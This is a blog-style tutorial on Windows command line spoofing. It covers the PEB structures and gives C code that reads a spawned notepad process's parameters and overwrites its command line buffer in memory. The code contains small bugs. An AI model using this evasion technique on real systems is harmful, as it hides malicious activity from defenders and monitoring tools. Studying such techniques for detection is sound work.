---
layout: post
title: "Command Line Spoofing"
date: 2024-07-30 09:49:00 +0000
tags: [Malware Development]
categories: [Malware Development]
---

Command line spoofing is a technique where the instructions given to a program through the command line are altered or replaced. To make this clearer, let’s break it down:

When a program runs, it often needs specific details or instructions to work correctly. These instructions are provided through the command line a way to type in commands and arguments that the operating system uses to run the program. For example, you might use command line arguments to tell a program which files to open or what actions to perform. 

As can be seen in the screenshot below, the command line interface displays these arguments.

![commandline_demonstration](/assets/img/command_line_spoofing/commandline_demonstration.png)


Command line spoofing happens when these instructions are changed or manipulated, leading the program to perform actions it wasn’t originally intended to. This can cause the program to behave differently or produce unexpected results.


Before Starting
----

To change the command line of a process, we first need to know about Process Environment Block (PEB).

The Process Environment Block (PEB) is a data structure that holds important information about a process. It includes details such as:

- Whether the program is being debugged
- Loaded modules
- Process parameters, and more

Since the PEB is located in user space, it can be accessed relatively easily. The structure of the PEB looks like this:


```c
typedef struct _PEB {
  BYTE                          Reserved1[2];
  BYTE                          BeingDebugged;
  BYTE                          Reserved2[1];
  PVOID                         Reserved3[2];
  PPEB_LDR_DATA                 Ldr;
  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
  PVOID                         Reserved4[3];
  PVOID                         AtlThunkSListPtr;
  PVOID                         Reserved5;
  ULONG                         Reserved6;
  PVOID                         Reserved7;
  ULONG                         Reserved8;
  ULONG                         AtlThunkSListPtr32;
  PVOID                         Reserved9[45];
  BYTE                          Reserved10[96];
  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
  BYTE                          Reserved11[128];
  PVOID                         Reserved12[1];
  ULONG                         SessionId;
} PEB, *PPEB;

```


In the `PEB` structure, the `ProcessParameters` field refers to the `PRTL_USER_PROCESS_PARAMETERS` structure which is our main focus because it contains the command line information of the process. To understand why this is important for spoofing the command line, let’s take a look at the structure:

```c

typedef struct _RTL_USER_PROCESS_PARAMETERS {
  BYTE           Reserved1[16];
  PVOID          Reserved2[10];
  UNICODE_STRING ImagePathName;
  UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

```

The `PRTL_USER_PROCESS_PARAMETERS` structure includes a `CommandLine` field, which is a `UNICODE_STRING` structure. This field contains the actual command line arguments used by the process. To understand how to modify the command line, we need to take a closer look at the `UNICODE_STRING` structure.


```c
typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;
```

The `UNICODE_STRING` structure includes a `Buffer` field, which points to the actual command line arguments for the process. This `Buffer` contains the location where the command line string is stored.

If we can overwrite the data at the location pointed to by the `Buffer`, we should be able to change the command line arguments of the process.


Technique
---


To change the command line of a process, we first need to find the address of the `PEB` (Process Environment Block). Here’s how we can do it:

1. **Retrieve the `PEB` Address**:
   - Use the [`NtQueryInformationProcess`](https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess) function with the `ProcessBasicInformation` value for the `ProcessInformationClass` parameter. This function provides a `PROCESS_BASIC_INFORMATION` structure.
   - The `PROCESS_BASIC_INFORMATION` structure contains the address of the `PEB`.

2. **Access the `PEB` Structure**:
   - Once we have the `PEB` address from the `PROCESS_BASIC_INFORMATION` structure, we need to read the process's memory to access the `PEB` structure itself.



We will use a custom function called `ReadMemoryFromRemoteProcess` to retrieve the `PEB` structure from the process’s memory. This function internally uses the WINAPI function [`ReadProcessMemory`](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory), which is used to read data from a specified memory location in a different process.


```c

BOOL ReadMemoryFromRemoteProcess(HANDLE hprocess, LPVOID lpbaseaddress, LPVOID* lpbuffer, SIZE_T szsize)
{
	SIZE_T numberofbytesread;

	*lpbuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, szsize);

	if (lpbuffer == NULL) {
		printf("Heap allocation failed with error no %x\n", GetLastError());
	}

	if (!ReadProcessMemory(hprocess, lpbaseaddress, *lpbuffer, szsize, &numberofbytesread) || szsize != numberofbytesread) {


		printf("readprocess memroy failed with error no %x\n", GetLastError());
		return FALSE;
	}


	return TRUE;
}

```


After accessing the `PEB` structure, we will locate and modify the `CommandLine` field. To do this, we use a custom function named `WriteMemoryToRemoteProcess`. This function utilizes the `WriteProcessMemory` WinAPI function to write the new command line data into the target process's memory space.



```c

BOOL WriteMemoryToRemoteProcess(HANDLE hprocess, LPVOID lpbaseaddress, LPVOID lpbuffer, SIZE_T szsize) 
{

	SIZE_T lpNumberOfBytesWritten = 0;

	if (!WriteProcessMemory(hprocess, lpbaseaddress, lpbuffer, szsize, &lpNumberOfBytesWritten) || szsize != lpNumberOfBytesWritten) {
		printf("write process memory failed with error no %x\n", GetLastError());

		return FALSE;
	}
return TRUE;


}
```

Logic
---
1. Either create a new process or obtain a handle to an existing process where the command line needs to be modified.
2. Access the buffer in the target process's memory where the current command line is stored.
3. Prepare the new command line string that you want to write into the process's memory.
4.  Use the `WriteProcessMemory` function to write the new command line data to the appropriate memory address in the target process.


Commandlinespoofing function
---
`Commandlinespoofing` is a function that implements above technique and logics to spoof the commandline of a process.  in this case notepad is created for simplicity in demonstration.


```c
BOOL Commandlinespoofing() {


	typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
		HANDLE ProcessHandle,
		PROCESSINFOCLASS ProcessInformationClass,
		PVOID ProcessInformation,
		ULONG ProcessInformationLength,
		PULONG ReturnLength
		);

// first command
	WCHAR commandline[] = L"notepad first command ";

	STARTUPINFOW SI = { 0 };
	SI.cb = sizeof(SI);
	PRTL_USER_PROCESS_PARAMETERS pprocessparams;
	PROCESS_INFORMATION PI = { 0 };

	NTSTATUS status;

	PROCESS_BASIC_INFORMATION PBI = { 0 };

	PPEB ppeb = NULL;




	if (!CreateProcessW(NULL, commandline, NULL, NULL, FALSE, 0, NULL, NULL, &SI, &PI)) {

		printf("Create process failed with error no %x\n", GetLastError());
		return FALSE;
	}
// getting address of NtQueryInformationProcess
	fnNtQueryInformationProcess NTinformationprocess = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess");


	if (NTinformationprocess == NULL) {

		printf("GetprocAddress or GetmoduleHandleW failed with error no %x\n", GetLastError());
		return FALSE;

	}

	ULONG returnlength;


	status = NTinformationprocess(PI.hProcess, ProcessBasicInformation, &PBI, sizeof(PBI), &returnlength);

	if (status != 0) {

		printf("ntinformation process failed with error no %x\n", GetLastError());

	}
// ReadMemoryFromRemoteProcess function mentioned above
	if (!ReadMemoryFromRemoteProcess(PI.hProcess, PBI.PebBaseAddress,&ppeb, sizeof(PEB))) {
		return FALSE;
	}


//sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF , 0xFF is added so we can reach to the command line 
	if (!ReadMemoryFromRemoteProcess(PI.hProcess, ppeb->ProcessParameters, &pprocessparams, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF)) {
		HeapFree(GetProcessHeap(), 0, pprocessparams);
		return FALSE;
	}

//new commandline
	WCHAR updatecommandline[] = L"updated command line";

// WriteMemoryToRemoteProcess function mentioned above
	if (!WriteMemoryToRemoteProcess(PI.hProcess, pprocessparams->CommandLine.Buffer, updatecommandline, sizeof(updatecommandline))) {
		return FALSE;
	}

}


```



Execution
---

For simplicity, we use `Notepad` for the execution process.

`Notepad` is started with "notepad first command" command line then it has been spoofed to "updated command line". 


![commandline_spoofing](/assets/img/command_line_spoofing/noteapad_first_command.png)

**NOTE:** Command line spoofing does not work with `calc.exe` in my case for demonstration. This might be because `calc.exe` falls under the [Universal Windows Platform (UWP)](https://www.bing.com/ck/a?!&&p=189f3e1367c572cbJmltdHM9MTcyMjI5NzYwMCZpZ3VpZD0yMDhhZmQxMi1hYWY0LTYyODMtMDM4ZC1lOWRlYWI3ZDYzNTImaW5zaWQ9NTQzNw&ptn=3&ver=2&hsh=3&fclid=208afd12-aaf4-6283-038d-e9deab7d6352&psq=uwp+&u=a1aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL2VuLXVzL3dpbmRvd3MvdXdwL2dldC1zdGFydGVkL3VuaXZlcnNhbC1hcHBsaWNhdGlvbi1wbGF0Zm9ybS1ndWlkZQ&ntb=1), which may not support traditional command line spoofing techniques.







